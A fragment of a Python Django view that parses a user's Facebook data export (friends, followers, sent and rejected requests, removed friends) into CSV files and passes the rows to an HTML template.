    print("ignore errors")


def amit(request):
    """
    Write story here
    """

    # importing libraries
    import time
    from datetime import date, datetime
    import zipfile
    import os
    import datetime
    import json
    import pandas as pd

    today_time = date.fromtimestamp(time.time())
    friends_and_followers_path: str = 'D:/webapp/project/media/facebook_{}/friends_and_followers'.format(today_time)

    """ 
    arr = os.listdir(friends_and_followers_path)
    print(arr)
    print("arr[0]")
    print(arr[0])
    print("arr[1]")
    print(arr[1])
    print(arr[2])
    print(arr[-1])
    """

    """
    friends.json
    """

    path1: str = friends_and_followers_path + "/friends.json"

    x1 = open(path1)
    d1 = json.load(x1)

    name1 = []
    timestamp1 = []

    for i in range(0, len(d1['friends_v2'])):
        name1.append(d1['friends_v2'][i]['name'])
        timestamp1.append(d1['friends_v2'][i]['timestamp'])

    dict1 = {'name': name1, 'timestamp': timestamp1}
    df1 = pd.DataFrame(dict1)

    from datetime import datetime

    date1 = []
    time1 = []
    for i in range(0, len(df1['timestamp'])):
        date1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time1.append(datetime.fromtimestamp(int(df1['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df1['date'] = date1
    df1['time'] = time1

    path1_csv = path1[:-4] + 'csv'

    df1.to_csv(path1_csv)

    df_1 = pd.read_csv(path1_csv)

    name_lst1 = df_1['name'].tolist()
    date_lst1 = df_1['date'].tolist()
    time_lst1 = df_1['time'].tolist()

    allData1 = []
    for i in range(df_1.shape[0]):
        temp = df_1.iloc[i]
        allData1.append(dict(temp))

    """
    friends_you_see_less.json
    """

    path2: str = friends_and_followers_path + "/friends_you_see_less.json"

    x2 = open(path2)
    d2 = json.load(x2)

    timestamp2 = []
    name2 = []
    uri2 = []

    for i in range(0, len(d2['friends_you_see_less_v2'])):
        print(d2['friends_you_see_less_v2'][i]['entries'][i])
        timestamp2.append(d2['friends_you_see_less_v2'][i]['entries'][i]['timestamp'])
        name2.append(d2['friends_you_see_less_v2'][i]['entries'][i]['data']['name'])
        uri2.append(d2['friends_you_see_less_v2'][i]['entries'][i]['data']['uri'])

    dict2 = {'timestamp': timestamp2, 'name': name2, 'uri': uri2}
    df2 = pd.DataFrame(dict2)

    from datetime import datetime

    date2 = []
    time2 = []
    for i in range(0, len(df2['timestamp'])):
        print(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S'))
        date2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time2.append(datetime.fromtimestamp(int(df2['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df2['date'] = date2
    df2['time'] = time2

    path2_csv = path2[:-4] + 'csv'

    df2.to_csv(path2_csv)

    df_2 = pd.read_csv(path2_csv)

    name_lst2 = df_2['name'].tolist()
    uri_lst2 = df_2['uri'].tolist()
    date_lst2 = df_2['date'].tolist()
    time_lst2 = df_2['time'].tolist()

    allData2 = []
    for i in range(df_2.shape[0]):
        temp2 = df_2.iloc[i]
        allData2.append(dict(temp2))

    """
    friend_requests_sent.json
    """

    path3: str = friends_and_followers_path + "/friend_requests_sent.json"

    x3 = open(path3)
    d3 = json.load(x3)

    name3 = []
    timestamp3 = []

    for i in range(0, len(d3['sent_requests_v2'])):
        name3.append(d3['sent_requests_v2'][i]['name'])
        timestamp3.append(d3['sent_requests_v2'][i]['timestamp'])

    dict3 = {'name': name3, 'timestamp': timestamp3}
    df3 = pd.DataFrame(dict3)

    from datetime import datetime

    date3 = []
    time3 = []
    for i in range(0, len(df3['timestamp'])):
        date3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time3.append(datetime.fromtimestamp(int(df3['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df3['date'] = date3
    df3['time'] = time3

    name_lst3 = df3['name'].tolist()
    date_lst3 = df3['date'].tolist()
    time_lst3 = df3['time'].tolist()

    path3_csv = path3[:-4] + 'csv'

    df3.to_csv(path3_csv)

    df_3 = pd.read_csv(path3_csv)

    name_lst3 = df_3['name'].tolist()
    date_lst3 = df_3['date'].tolist()
    time_lst3 = df_3['time'].tolist()

    allData3 = []
    for i in range(df_3.shape[0]):
        temp3 = df_3.iloc[i]
        allData3.append(dict(temp3))

    """
    people_who_follow_you.json
    """

    path4: str = friends_and_followers_path + "/people_who_follow_you.json"

    x4 = open(path4)
    d4 = json.load(x4)

    name4 = []

    for i in range(0, len(d4['followers_v2'])):
        name4.append(d4['followers_v2'][i]['name'])

    dict4 = {'name': name4}
    df4 = pd.DataFrame(dict4)

    path4_csv = path4[:-4] + 'csv'

    df4.to_csv(path4_csv)

    df_4 = pd.read_csv(path4_csv)

    name_lst4 = df_4['name'].tolist()

    allData4 = []
    for i in range(df_4.shape[0]):
        temp4 = df_4.iloc[i]
        allData4.append(dict(temp4))

    """
    rejected_friend_requests.json
    """

    path5: str = friends_and_followers_path + "/rejected_friend_requests.json"

    x5 = open(path5)
    d5 = json.load(x5)

    name5 = []
    timestamp5 = []

    for i in range(0, len(d5['rejected_requests_v2'])):
        name5.append(d5['rejected_requests_v2'][i]['name'])
        timestamp5.append(d5['rejected_requests_v2'][i]['timestamp'])

    dict5 = {'name': name5, 'timestamp': timestamp5}
    df5 = pd.DataFrame(dict5)

    from datetime import datetime

    date5 = []
    time5 = []
    for i in range(0, len(df5['timestamp'])):
        date5.append(datetime.fromtimestamp(int(df5['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time5.append(datetime.fromtimestamp(int(df5['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df5['date'] = date5
    df5['time'] = time5

    path5_csv = path5[:-4] + 'csv'

    df5.to_csv(path5_csv)

    df_5 = pd.read_csv(path5_csv)

    name_lst5 = df_5['name'].tolist()
    date_lst5 = df_5['date'].tolist()
    time_lst5 = df_5['time'].tolist()

    allData5 = []
    for i in range(df_5.shape[0]):
        temp5 = df_5.iloc[i]
        allData5.append(dict(temp5))

    """
    removed_friends.json
    """

    path6: str = friends_and_followers_path + "/removed_friends.json"

    x6 = open(path6)
    d6 = json.load(x6)

    name6 = []
    timestamp6 = []

    for i in range(0, len(d6['deleted_friends_v2'])):
        name6.append(d6['deleted_friends_v2'][i]['name'])
        timestamp6.append(d6['deleted_friends_v2'][i]['timestamp'])

    dict6 = {'name': name6, 'timestamp': timestamp6}
    df6 = pd.DataFrame(dict6)

    from datetime import datetime

    date6 = []
    time6 = []
    for i in range(0, len(df6['timestamp'])):
        date6.append(datetime.fromtimestamp(int(df6['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time6.append(datetime.fromtimestamp(int(df6['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df6['date'] = date6
    df6['time'] = time6

    path6_csv = path6[:-4] + 'csv'

    df6.to_csv(path6_csv)

    df_6 = pd.read_csv(path6_csv)

    name_lst6 = df_6['name'].tolist()
    date_lst6 = df_6['date'].tolist()
    time_lst6 = df_6['time'].tolist()

    allData6 = []
    for i in range(df_6.shape[0]):
        temp6 = df_6.iloc[i]
        allData6.append(dict(temp6))

    """
    who_you_follow.json
    """

    path7: str = friends_and_followers_path + "/who_you_follow.json"

    x7 = open(path7)
    d7 = json.load(x7)

    name7 = []
    timestamp7 = []

    for i in range(0, len(d7['following_v2'])):
        name7.append(d7['following_v2'][i]['name'])
        timestamp7.append(d7['following_v2'][i]['timestamp'])

    dict7 = {'name': name7, 'timestamp': timestamp7}
    df7 = pd.DataFrame(dict7)

    from datetime import datetime

    date7 = []
    time7 = []
    for i in range(0, len(df7['timestamp'])):
        date7.append(datetime.fromtimestamp(int(df7['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[0])
        time7.append(datetime.fromtimestamp(int(df7['timestamp'][i])).strftime('%d-%m-%y, %H:%M:%S').split(',')[1])

    df7['date'] = date7
    df7['time'] = time7

    path7_csv = path7[:-4] + 'csv'

    df7.to_csv(path7_csv)

    df_7 = pd.read_csv(path7_csv)

    name_lst7 = df_7['name'].tolist()
    date_lst7 = df_7['date'].tolist()
    time_lst7 = df_7['time'].tolist()

    allData7 = []
    for i in range(df_7.shape[0]):
        temp7 = df_7.iloc[i]
        allData7.append(dict(temp7))

    context = {"allData1": allData1, "allData2": allData2, "allData3": allData3, "allData4": allData4,
               "allData5": allData5, "allData6": allData6, "allData7": allData7, "date_lst7":date_lst7,"time_lst7":time_lst7}

    return render(request, 'app/amit.html', context)
